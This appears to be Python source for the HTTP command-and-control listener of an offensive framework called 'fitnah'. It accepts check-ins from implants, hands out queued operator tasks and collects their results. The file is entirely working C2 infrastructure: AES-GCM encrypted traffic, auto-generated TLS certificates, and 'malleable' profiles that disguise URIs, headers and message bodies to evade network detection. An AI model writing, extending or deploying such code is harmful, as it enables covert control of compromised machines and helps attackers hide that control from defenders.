"""
HTTP C2 listener — lightweight aiohttp server that accepts implant connections.

Endpoints (default, overridden by C2Profile if set):
  POST /checkin   — implant sends CHECKIN JSON, receives pending tasks
  POST /ack       — implant sends task result ACK

Supports AES-256-GCM encrypted bodies (X-Encrypted: 1 header).
Supports TLS via ssl stdlib; auto_tls=True generates a self-signed cert.
Supports malleable C2 profiles (C2Profile) for URI/header disguise.
"""
from __future__ import annotations

import base64
import json
import logging
import os
import ssl
import tempfile
from pathlib import Path
from typing import Callable, TYPE_CHECKING

from fitnah.implant.core.crypto import ImplantCrypto

if TYPE_CHECKING:
    from fitnah.c2.profiles import C2Profile

log = logging.getLogger(__name__)


class HTTPListener:
    def __init__(
        self,
        host: str,
        port: int,
        auth_key: str,
        on_message: Callable,   # async(msg: dict) — same interface as transport queue
        tls_cert: str = "",
        tls_key: str = "",
        auto_tls: bool = False,
        profile: "C2Profile | None" = None,
    ):
        self._host       = host
        self._port       = port
        self._auth_key   = auth_key
        self._on_message = on_message
        self._tls_cert   = tls_cert
        self._tls_key    = tls_key
        self._auto_tls   = auto_tls
        self._profile    = profile
        self._pending_tasks: dict[str, list] = {}  # agent_id → [task, ...]
        self._runner     = None
        self._site       = None
        self._crypto     = ImplantCrypto(secret=auth_key)
        self._queue_path = Path("data/http_queue.jsonl")
        self._load_queue()

    # ── TLS helpers ───────────────────────────────────────────────────────────

    @staticmethod
    def generate_self_signed(cert_path: str, key_path: str, cn: str = "fitnah-c2") -> bool:
        """
        Generate a self-signed RSA-2048 certificate using the cryptography library.
        Returns True on success, False if cryptography is not installed.
        """
        try:
            import datetime
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
        except ImportError:
            log.warning("[http] 'cryptography' not installed — cannot generate self-signed cert")
            return False

        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
        now  = datetime.datetime.utcnow()
        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + datetime.timedelta(days=3650))
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName(cn)]),
                critical=False,
            )
            .sign(key, hashes.SHA256())
        )

        Path(cert_path).parent.mkdir(parents=True, exist_ok=True)
        Path(key_path).parent.mkdir(parents=True, exist_ok=True)

        with open(cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(key_path, "wb") as f:
            f.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))
        log.info("[http] self-signed cert written: %s  key: %s", cert_path, key_path)
        return True

    def _build_ssl_context(self) -> ssl.SSLContext | None:
        cert = self._tls_cert
        key  = self._tls_key

        if self._auto_tls and not (cert and key):
            cert = "data/tls/server.crt"
            key  = "data/tls/server.key"
            if not (Path(cert).exists() and Path(key).exists()):
                ok = self.generate_self_signed(cert, key)
                if not ok:
                    log.warning("[http] auto_tls: cert generation failed — falling back to plain HTTP")
                    return None

        if cert and key:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert, key)
            log.info("[http] TLS enabled (cert=%s)", cert)
            return ctx
        return None

    # ── lifecycle ─────────────────────────────────────────────────────────────

    async def start(self) -> None:
        try:
            from aiohttp import web
        except ImportError:
            log.warning("[http] aiohttp not installed — HTTP listener disabled")
            return

        checkin_uri = self._profile.checkin_uri if self._profile else "/checkin"
        ack_uri     = self._profile.ack_uri     if self._profile else "/ack"

        app = web.Application()
        app.router.add_post(checkin_uri, self._handle_checkin)
        app.router.add_post(ack_uri,     self._handle_ack)

        self._runner = web.AppRunner(app)
        await self._runner.setup()

        ssl_ctx = self._build_ssl_context()
        self._site = web.TCPSite(self._runner, self._host, self._port, ssl_context=ssl_ctx)
        await self._site.start()
        scheme = "https" if ssl_ctx else "http"
        log.info("[http] listener started on %s://%s:%d", scheme, self._host, self._port)

    async def stop(self) -> None:
        if self._runner:
            await self._runner.cleanup()
            log.info("[http] listener stopped")

    def queue_task(self, agent_id: str, task: dict) -> None:
        """Called by kernel to push a task to an agent's queue."""
        self._pending_tasks.setdefault(agent_id, []).append(task)
        self._save_queue()

    # ── queue persistence ─────────────────────────────────────────────────────

    def _save_queue(self) -> None:
        """Atomically persist _pending_tasks to data/http_queue.jsonl."""
        try:
            self._queue_path.parent.mkdir(parents=True, exist_ok=True)
            tmp_fd, tmp_path = tempfile.mkstemp(
                dir=str(self._queue_path.parent), suffix=".tmp"
            )
            try:
                with os.fdopen(tmp_fd, "w", encoding="utf-8") as fh:
                    for agent_id, tasks in self._pending_tasks.items():
                        if tasks:
                            fh.write(json.dumps({"agent_id": agent_id, "tasks": tasks}) + "\n")
                os.replace(tmp_path, str(self._queue_path))
            except Exception:
                try:
                    os.unlink(tmp_path)
                except OSError:
                    pass
                raise
        except Exception as exc:
            log.warning("[http] could not save queue: %s", exc)

    def _load_queue(self) -> None:
        """Reload pending tasks from data/http_queue.jsonl on startup."""
        if not self._queue_path.exists():
            return
        try:
            loaded = 0
            with open(self._queue_path, encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        entry    = json.loads(line)
                        agent_id = entry["agent_id"]
                        tasks    = entry["tasks"]
                        if isinstance(tasks, list):
                            self._pending_tasks.setdefault(agent_id, []).extend(tasks)
                            loaded += len(tasks)
                    except (json.JSONDecodeError, KeyError) as exc:
                        log.warning("[http] skipping malformed queue line: %s", exc)
            log.info("[http] loaded %d queued task(s) from %s", loaded, self._queue_path)
        except Exception as exc:
            log.warning("[http] could not load queue: %s", exc)

    # ── request body decryption ───────────────────────────────────────────────

    async def _read_body(self, request) -> dict:
        """
        Read and decrypt request body.
        If X-Encrypted: 1 header is present: base64-decode, AES-GCM decrypt, parse JSON.
        Otherwise try plain JSON (backwards compat).
        Also strips profile body_prepend/body_append if a profile is active.
        """
        raw = await request.read()

        if self._profile:
            pre  = self._profile.body_prepend
            post = self._profile.body_append
            if pre and raw.startswith(pre):
                raw = raw[len(pre):]
            if post and raw.endswith(post):
                raw = raw[:-len(post)]

        if request.headers.get("X-Encrypted") == "1":
            try:
                decoded   = base64.b64decode(raw)
                plaintext = self._crypto.decrypt(decoded)
                return json.loads(plaintext)
            except Exception as exc:
                log.warning("[http] decryption failed: %s", exc)
                raise ValueError(f"Decryption error: {exc}")

        # plain JSON fallback
        return json.loads(raw)

    # ── endpoint handlers ─────────────────────────────────────────────────────

    async def _handle_checkin(self, request) -> "web.Response":
        from aiohttp import web

        if not self._auth_ok(request):
            return web.Response(status=403, text="Forbidden")

        try:
            data = await self._read_body(request)
        except Exception:
            return web.Response(status=400, text="Bad request")

        agent_id = data.get("agent_id", request.remote)

        msg = {
            "chat_id":    agent_id,
            "sender_id":  agent_id,
            "text":       json.dumps({**data, "type": "CHECKIN"}),
            "_transport": "http",
        }
        await self._on_message(msg)

        tasks = self._pending_tasks.pop(agent_id, [])
        if tasks:
            self._save_queue()

        # Encrypt response body so tasks are never sent cleartext
        resp_payload = json.dumps({"status": "ok", "tasks": tasks}).encode()
        enc_body     = base64.b64encode(self._crypto.encrypt(resp_payload))
        resp_headers = {"X-Encrypted": "1", "Content-Type": "application/octet-stream"}
        if self._profile:
            resp_headers.update(self._profile.headers)
            if self._profile.body_prepend or self._profile.body_append:
                enc_body = self._profile.body_prepend + enc_body + self._profile.body_append
        return web.Response(body=enc_body, headers=resp_headers)

    async def _handle_ack(self, request) -> "web.Response":
        from aiohttp import web

        if not self._auth_ok(request):
            return web.Response(status=403, text="Forbidden")

        try:
            data = await self._read_body(request)
        except Exception:
            return web.Response(status=400, text="Bad request")

        msg = {
            "chat_id":    request.headers.get("X-Agent-Id", "unknown"),
            "sender_id":  request.headers.get("X-Agent-Id", "unknown"),
            "text":       json.dumps({**data, "type": "ACK"}),
            "_transport": "http",
        }
        await self._on_message(msg)

        resp_payload = b'{"status":"ok"}'
        enc_body     = base64.b64encode(self._crypto.encrypt(resp_payload))
        resp_headers = {"X-Encrypted": "1", "Content-Type": "application/octet-stream"}
        if self._profile:
            resp_headers.update(self._profile.headers)
            if self._profile.body_prepend or self._profile.body_append:
                enc_body = self._profile.body_prepend + enc_body + self._profile.body_append
        return web.Response(body=enc_body, headers=resp_headers)

    def _auth_ok(self, request) -> bool:
        return request.headers.get("X-Agent-Key", "") == self._auth_key
